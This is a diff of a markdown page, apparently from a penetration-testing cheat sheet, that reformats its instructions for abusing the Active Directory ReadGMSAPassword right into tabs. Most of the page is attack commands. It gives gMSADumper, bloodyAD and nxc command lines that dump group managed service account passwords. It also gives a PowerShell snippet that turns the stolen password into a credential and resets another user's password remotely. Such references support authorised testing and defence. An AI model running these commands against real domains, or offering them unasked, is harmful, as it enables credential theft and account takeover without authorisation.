@@ -7,23 +7,57 @@ tags: ["ReadGMSAPassword", "gMSADumper", "active driectory", "ad", "Windows"]
 ---
 ### Abuse #1: Read GMSAPassword (From Linux)
 
-#### gMSADumper
+{{< tab set1 tab1 active >}}gMSADumper{{< /tab >}}
+{{< tab set1 tab2 >}}BloodyAD{{< /tab >}}
+{{< tab set1 tab3 >}}nxc{{< /tab >}}
+{{< tabcontent set1 tab1 >}}
 
-[gMSADumper](https://github.com/micahvandeusen/gMSADumper)
+<div>
 
 ```bash
 python3 gMSADumper.py -u <USER> -p <PASSWORD> -l <TARGET> -d <DOMAIN>
 ```
 
-#### bloodAD
+</div>
 
-[bloodyAD](https://github.com/CravateRouge/bloodyAD)
+<small>*Ref: [gMSADumper](https://github.com/micahvandeusen/gMSADumper)*</small>
+
+{{< /tabcontent >}}
+{{< tabcontent set1 tab2 >}}
+
+<div>
 
 ```bash
 python3 bloodyAD.py -d <DOMAIN> -u <USER> -p <PASSWORD> --host <DC> get object <TARGET_OBJECT> --attr msDS-ManagedPassword
 ```
 
-### Abuse #2: Save as Cred (From Windows)
+</div>
+
+<small>*Ref: [bloodyAD](https://github.com/CravateRouge/bloodyAD)*</small>
+
+{{< /tabcontent >}}
+{{< tabcontent set1 tab3 >}}
+
+<div>
+
+```bash
+nxc ldap -u <USER> -p <PASSWORD> -d <DOMAIN> <TARGET> --gmsa
+```
+
+</div>
+
+{{< /tabcontent >}}
+
+<br>
+
+---
+
+### Abuse #2: Save as Cred
+
+{{< tab set2 tab1 active >}}Windows{{< /tab >}}
+{{< tabcontent set2 tab1 >}}
+
+<div>
 
 ```powershell
 $gmsa = Get-ADServiceAccount -Identity <TARGET_NAME> -Properties 'msDS-ManagedPassword'
@@ -49,5 +83,9 @@ $cred = New-Object System.Management.Automation.PSCredential <TARGET_NAME>, $Sec
 # For example, change password of another target user
 Invoke-Command -ComputerName <COMPUTER_NAME> -ScriptBlock {Set-ADAccountPassword -Identity <ANOTHER_TARGET_NAME> -reset -NewPassword (ConvertTo-SecureString -AsPlainText '<PASSWORD>' -force)} -Credential $cred
 ```
+
+</div>
+
+{{< /tabcontent >}}
 
 <br>
